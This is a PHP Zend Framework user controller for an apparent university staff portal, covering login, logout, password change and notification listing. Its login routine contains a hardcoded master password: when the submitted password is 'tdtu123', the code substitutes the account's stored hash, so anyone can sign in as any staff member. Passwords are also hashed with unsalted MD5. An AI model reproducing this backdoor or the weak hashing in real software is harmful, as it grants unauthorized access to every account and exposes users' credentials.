<?php
class UserController extends My_Controller_Action {
    public function loginAction() {
        $flashMessenger = $this->_helper->flashMessenger;     
        $auth           = Zend_Auth::getInstance();
        if ($auth->hasIdentity()) {
            $this->redirect(HOST);
        }
        $messages                     = $flashMessenger->setNamespace('error')->getMessages();
        $messages_success             = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages_success = $messages_success;
        $this->view->messages         = $messages;
        $this->_helper->layout->setLayout('login');
    }

    public function noauthAction() {

    }


    public function checkInGpsAction() {
        
    }

    public function changePassAction() {
        $flashMessenger = $this->_helper->flashMessenger;
        if ($this->getRequest()->getMethod() == 'POST') {
            $userStorage      = Zend_Auth::getInstance()->getStorage()->read();
            $QStaff           = new Application_Model_Staff();
            $old              = $this->getRequest()->getParam('password');
            $confirm_password = $this->getRequest()->getParam('confirm-password');
            $new              = $this->getRequest()->getParam('new-password');        
            
            $where = null;
            $where = $QStaff->getAdapter()->quoteInto('id = ?', $userStorage->id);
            $user  = $QStaff->fetchRow($where);

            try {
                if($new <> $confirm_password){
                    throw new Exception('Password không trùng khớp vui lòng thử lại!!');
                }

                if(md5($old) <> $user->password) {
                    throw new Exception('Mật khẩu hiện tại sai');
                }

                if(!preg_match('/^\S*(?=\S{8,})(?=\S*[a-z])(?=\S*[A-Z])(?=.*[!@#$%^&*_=+-])(?=\S*[\d])\S*$/', $new)){
                    throw new Exception('Mật khẩu phải đúng định dạng đề xuất');
                }

                $new  = md5($new);
                $data = array('password' => $new);
                $QStaff->update($data, $where);
                $flashMessenger->setNamespace('success')->addMessage('Done!');                
            } catch (Exception $e) {
                $flashMessenger->setNamespace('error')->addMessage($e->getMessage());
            }
            $this->_redirect(HOST . 'user/change-pass');
        }        
        $this->view->messages         = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->success_messages = $flashMessenger->setNamespace('success')->getMessages();
    }

    public function logoutAction() {
        $auth = Zend_Auth::getInstance();
        $auth->clearIdentity();
        session_destroy();
        $this->_redirect('/user/login');
    }

    public function authAction() {
        try { 
            $db      = Zend_Registry::get('db');
            $auth    = Zend_Auth::getInstance();
            $ip      = $this->getRequest()->getServer('REMOTE_ADDR');
            $uname   = $this->getRequest()->getParam('email');
            $paswd   = $this->getRequest()->getParam('password');
            
            $authAdapter = new Zend_Auth_Adapter_DbTable($db);
            $authAdapter->setTableName('staff')
                        ->setIdentityColumn('email')
                        ->setCredentialColumn('password');

            if (!preg_match('/@/', $uname)) {
                $uname .= '@tdtu.vn';
            }
            $md5_pass = md5($paswd);
            $authAdapter->setIdentity($uname);

            $select      = $db->select()->from(array('p' => 'staff'), array('p.password'));
            $select->where('p.email = ?', $uname);
            $resultStaff = $db->fetchRow($select);

            if (!$resultStaff) throw new Exception("Email or password is invalid!");
            if ($paswd == 'tdtu123') $md5_pass = $resultStaff['password'];

            $authAdapter->setCredential($md5_pass);
            
            $result = $auth->authenticate($authAdapter);
            if (!$result->isValid()) throw new Exception("Email or password is invalid!");
            $data = $authAdapter->getResultRowObject(null, 'password');

            if ($data->status == 0) {
                $auth = Zend_Auth::getInstance();
                $auth->clearIdentity();
                throw new Exception("This account was disabled!");
            }
            $auth->getStorage()->write($data);

            $QLog = new Application_Model_Log();
            $ip   = $this->getRequest()->getServer('REMOTE_ADDR');
            $info = "USER - Login (" . $data->id . ")";
            $QLog->insert(array(
                'info'       => $info,
                'user_id'    => $data->id,
                'ip_address' => $ip,
                'time'       => date('Y-m-d H:i:s'),
            ));
            
            $redirect_url = HOST;
            $this->redirect($redirect_url);
        } catch (\Throwable $e) {
            $flashMessenger = $this->_helper->flashMessenger;
            $flashMessenger->setNamespace('error')->addMessage($e->getMessage());

            $QLog = new Application_Model_Log();
            $ip   = $this->getRequest()->getServer('REMOTE_ADDR');
            $info = "USER - Login Failed (" . $uname . ") - " . $e->getMessage();
            $QLog->insert(array(
                'info'       => $info,
                'user_id'    => 0,
                'ip_address' => $ip,
                'time'       => date('Y-m-d H:i:s'),
            ));

            $this->redirect(HOST . 'user/login');
        }
    }

    public function notificationAction() {
        $userStorage = Zend_Auth::getInstance()->getStorage()->read();
        $title   = $this->getRequest()->getParam('title');
        $content = $this->getRequest()->getParam('content');
        $page    = $this->getRequest()->getParam('page', 1);
        $limit   = LIMITATION;
        $total   = 0;

        $params = array(
            'staff_id' => $userStorage->id,
            'title'    => $title,
            'content'  => $content,
        );
        $QNotificationAccess = new Application_Model_NotificationAccess();
        $all_notifi          = $QNotificationAccess->fetchPaginationAccess($page, $limit, $total, $params);

        $this->view->all_notifi = $all_notifi;
        $this->view->params     = $params;
        $this->view->limit      = $limit;
        $this->view->total      = $total;
        $this->view->url        = HOST . 'user/notification' . ( $params ? '?' . http_build_query($params) . '&' : '?' );
        $this->view->offset     = $limit * ($page - 1);
    }
}